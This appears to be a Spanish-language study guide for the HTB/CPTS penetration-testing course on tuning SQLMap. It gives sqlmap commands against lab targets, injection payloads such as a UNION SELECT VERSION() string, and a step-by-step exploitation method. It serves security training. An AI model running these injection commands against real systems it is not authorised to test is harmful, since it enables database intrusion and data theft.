
## 1. Ajustar los ataques de SQLMap

SQLMap funciona normalmente con su configuración predeterminada, pero podemos modificar sus opciones para mejorar la detección de vulnerabilidades SQL Injection.

Cada payload está formado por dos elementos:

- **Vector:** código SQL que queremos ejecutar, por ejemplo `UNION ALL SELECT 1,2,VERSION()`.
    
- **Boundaries (delimitadores):** prefijos y sufijos que permiten introducir correctamente el vector en la consulta SQL original.
    

Ejemplo:

```
' UNION ALL SELECT 1,2,VERSION()-- -
```

En este caso:

- `'` cierra la cadena original.
    
- `UNION ALL SELECT 1,2,VERSION()` es el vector.
    
- `-- -` comenta el resto de la consulta.
    

---

## 2. Prefix y Suffix

En ocasiones, SQLMap no consigue construir automáticamente un payload válido porque la consulta SQL original utiliza paréntesis, comillas u otras estructuras.

Podemos definir manualmente el prefijo y el sufijo:

```
sqlmap -u 'http://www.example.com/?q=test' \
--prefix="%'))" \
--suffix="-- -"
```

### Ejemplo práctico

Supongamos que la aplicación utiliza esta consulta PHP:

```
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
```

La consulta SQL original sería:

```
SELECT id,name,surname FROM users WHERE id LIKE (('test')) LIMIT 0,1
```

Si utilizamos:

```
Prefix: %'))
Suffix: -- -
```

SQLMap puede construir un payload como:

```
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

El prefijo permite cerrar correctamente la estructura original, mientras que el sufijo comenta el resto.

**Cuándo utilizarlo:** cuando sabemos que existe una SQL Injection, pero SQLMap no consigue detectarla debido a la estructura de la consulta.

## 3. Level y Risk

SQLMap permite ampliar la cantidad de pruebas realizadas mediante `--level` y `--risk`.

### --level

Controla la cantidad de pruebas, vectores y delimitadores utilizados.

Valores:

```
--level=1   Valor predeterminado
--level=2
--level=3
--level=4
--level=5   Nivel máximo
```

Ejemplo:

```
sqlmap -u 'http://target.htb/?id=1' --level=5
```

Cuanto mayor sea el nivel:

- Más delimitadores se prueban.
    
- Se utilizan más variantes de payloads.
    
- Aumenta la posibilidad de detectar inyecciones menos habituales.
    
- El análisis tarda más tiempo.
    

### --risk

Controla el riesgo asociado a los payloads utilizados.

Valores:

```
--risk=1   Valor predeterminado
--risk=2
--risk=3   Riesgo máximo
```

Ejemplo:

```
sqlmap -u 'http://target.htb/?id=1' --risk=3
```

Al aumentar el riesgo, SQLMap incorpora pruebas que pueden provocar efectos secundarios sobre la aplicación o la base de datos.

Por ejemplo, determinados payloads basados en `OR` pueden resultar peligrosos si la consulta vulnerable modifica registros mediante `UPDATE` o `DELETE`.

### Diferencias entre configuraciones

|Configuración|Payloads aproximados|
|---|---|
|`--level=1 --risk=1`|72|
|`--level=5 --risk=3`|7865|

Estos valores corresponden al ejemplo del módulo para un único parámetro.

### Análisis completo

```
sqlmap -u 'http://target.htb/?id=1' \
--level=5 \
--risk=3
```

**Importante:** no es recomendable comenzar directamente con los valores máximos.

Primero utilizamos la configuración predeterminada y aumentamos los valores cuando sea necesario.

## 4. Mostrar los payloads utilizados

Podemos utilizar `-v` para aumentar la verbosidad de SQLMap.

Con `-v 3` podemos visualizar los payloads enviados.

```
sqlmap -u 'http://target.htb/?id=1' -v 3
```

Ejemplo de salida:

```
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'

[PAYLOAD] 1 AND 7496=4313
[PAYLOAD] 1 AND 7036=6691-- DmQN
[PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
```

Podemos combinarlo con `--level`:

```
sqlmap -u 'http://target.htb/?id=1' \
--level=5 \
-v 3
```

Esto permite observar los diferentes prefijos, sufijos y vectores que SQLMap intenta utilizar.

**Útil para:** identificar por qué un payload funciona o falla y reproducir manualmente una inyección.

# 5. Ajuste avanzado de detección

SQLMap normalmente compara las respuestas HTTP para identificar diferencias entre condiciones verdaderas y falsas.

Sin embargo, algunas aplicaciones contienen contenido dinámico que dificulta esta comparación.

Podemos indicar a SQLMap qué elementos debe utilizar para distinguir las respuestas.

## --code

Permite identificar una respuesta verdadera mediante su código HTTP.

Ejemplo:

```
TRUE  → HTTP 200
FALSE → HTTP 500
```

Utilizamos:

```
sqlmap -u 'http://target.htb/?id=1' --code=200
```

SQLMap utilizará el código `200` como indicador de una condición verdadera.

**Cuándo utilizarlo:** cuando las respuestas TRUE y FALSE presentan códigos HTTP diferentes.

---

## --titles

Permite comparar las respuestas utilizando el contenido de la etiqueta HTML `<title>`.

```
sqlmap -u 'http://target.htb/?id=1' --titles
```

Ejemplo:

```
<title>Welcome</title>
```

Frente a:

```
<title>Error</title>
```

**Cuándo utilizarlo:** cuando el título cambia dependiendo de si la condición SQL es verdadera o falsa.

---

## --string

Permite identificar una respuesta verdadera mediante una cadena específica.

Ejemplo:

```
TRUE  → Aparece "success"
FALSE → No aparece "success"
```

Ejecutamos:

```
sqlmap -u 'http://target.htb/?id=1' \
--string='success'
```

SQLMap buscará esa cadena en las respuestas HTTP.

**Cuándo utilizarlo:** cuando existe una palabra o mensaje que aparece únicamente en las respuestas verdaderas.

---

## --text-only

Permite comparar únicamente el contenido textual de la página, ignorando las etiquetas HTML.

```
sqlmap -u 'http://target.htb/?id=1' --text-only
```

Resulta útil cuando las respuestas contienen elementos dinámicos como:

```
<script>
<style>
<meta>
```

SQLMap elimina las etiquetas HTML para centrarse en el texto visible.

**Cuándo utilizarlo:** cuando el contenido HTML cambia constantemente y dificulta detectar diferencias entre respuestas.

---

# 6. Seleccionar técnicas SQL Injection

SQLMap permite limitar las técnicas de inyección utilizadas mediante `--technique`.

Las técnicas disponibles son:

|Letra|Técnica|
|---|---|
|`B`|Boolean-based blind|
|`E`|Error-based|
|`U`|UNION query-based|
|`S`|Stacked queries|
|`T`|Time-based blind|
|`Q`|Inline queries|

### Utilizar únicamente determinadas técnicas

Por ejemplo, para probar solamente:

- Boolean-based blind.
    
- Error-based.
    
- UNION query-based.
    

Ejecutamos:

```
sqlmap -u 'http://target.htb/?id=1' \
--technique=BEU
```

Esto excluye las técnicas `S`, `T` y `Q`.

### Ejemplos

**Únicamente UNION:**

```
sqlmap -u 'http://target.htb/?id=1' --technique=U
```

**Únicamente Error-based:**

```
sqlmap -u 'http://target.htb/?id=1' --technique=E
```

**Boolean-based y Time-based:**

```
sqlmap -u 'http://target.htb/?id=1' --technique=BT
```

**Cuándo utilizarlo:** cuando conocemos la técnica que funciona o queremos evitar pruebas que generan problemas, como los tiempos de espera provocados por las inyecciones Time-based.

# 7. Ajustar UNION SQL Injection

Las inyecciones basadas en `UNION` pueden necesitar información adicional para funcionar correctamente.

SQLMap permite configurar el número de columnas, los valores de relleno y la tabla utilizada.

## --union-cols

Permite indicar el número de columnas de la consulta SQL vulnerable.

Por ejemplo, si hemos descubierto manualmente que la consulta tiene 17 columnas:

```
sqlmap -u 'http://target.htb/?id=1' \
--union-cols=17
```

Esto evita que SQLMap tenga que descubrir automáticamente ese número.

**Cuándo utilizarlo:** cuando ya conocemos el número de columnas mediante pruebas manuales.

---

## --union-char

SQLMap utiliza normalmente valores como `NULL` o números aleatorios para rellenar las columnas de una consulta `UNION`.

Sin embargo, algunos tipos de datos pueden provocar errores de compatibilidad.

Podemos especificar otro valor:

```
sqlmap -u 'http://target.htb/?id=1' \
--union-char='a'
```

Esto permite utilizar el carácter `a` como valor de relleno.

**Cuándo utilizarlo:** cuando los valores predeterminados utilizados por SQLMap no son compatibles con los tipos de datos de la consulta original.

---

## --union-from

En determinados SGBD, como Oracle, las consultas `UNION` pueden necesitar una cláusula `FROM`.

Podemos indicar manualmente la tabla:

```
sqlmap -u 'http://target.htb/?id=1' \
--union-from=users
```

SQLMap utilizará la tabla indicada al construir los payloads correspondientes.

**Cuándo utilizarlo:** cuando la consulta `UNION` necesita una cláusula `FROM` y SQLMap no consigue determinarla automáticamente.

# 9. Metodología práctica para HTB / CPTS

## Paso 1. Comenzar con la configuración predeterminada

```
sqlmap -r req.txt --batch
```

## Paso 2. Seleccionar el parámetro vulnerable

```
sqlmap -r req.txt -p id --batch
```

## Paso 3. Aumentar las pruebas si no detecta la vulnerabilidad

```
sqlmap -r req.txt -p id \
--level=3 \
--risk=2 \
--batch
```

## Paso 4. Inspeccionar los payloads

```
sqlmap -r req.txt -p id \
--level=5 \
-v 3
```

## Paso 5. Ajustar la detección según las respuestas

Si las respuestas verdaderas contienen `Welcome`:

```
sqlmap -r req.txt -p id \
--string='Welcome'
```

Si las respuestas verdaderas devuelven HTTP 200:

```
sqlmap -r req.txt -p id \
--code=200
```

## Paso 6. Limitar las técnicas cuando sea necesario

```
sqlmap -r req.txt -p id \
--technique=BEU
```

## Paso 7. Ajustar UNION si conocemos su estructura

Si hemos descubierto que la consulta tiene 4 columnas:

```
sqlmap -r req.txt -p id \
--technique=U \
--union-cols=4
```

Si necesitamos modificar los delimitadores:

```
sqlmap -r req.txt -p id \
--prefix="%'))" \
--suffix="-- -"
```

---

## Puntos importantes para el examen

1. **No comenzar directamente con** `**--level=5 --risk=3**`**.** Primero probar la configuración predeterminada.
    
2. **Utilizar** `**-v 3**` para observar los payloads y comprender cómo SQLMap intenta explotar la vulnerabilidad.
    
3. **Utilizar** `**--prefix**` **y** `**--suffix**` cuando la estructura de la consulta impide introducir correctamente los payloads.
    
4. **Utilizar** `**--string**`**,** `**--code**` **o** `**--titles**` cuando SQLMap no consigue distinguir correctamente las respuestas TRUE y FALSE.
    
5. **Utilizar** `**--technique**` para limitar las pruebas a determinadas técnicas SQLi.
    
6. **Utilizar** `**--union-cols**` cuando conocemos el número de columnas de la consulta.
    
7. **Utilizar** `**--union-char**` cuando los valores de relleno predeterminados provocan errores.
    
8. **Utilizar** `**--union-from**` cuando necesitamos especificar una tabla en las consultas UNION.
    

**Idea principal:** cuando SQLMap no detecta una SQL Injection que hemos identificado manualmente, debemos revisar la estructura de la consulta, los delimitadores, las técnicas utilizadas y las diferencias entre las respuestas HTTP antes de aumentar indiscriminadamente las pruebas.
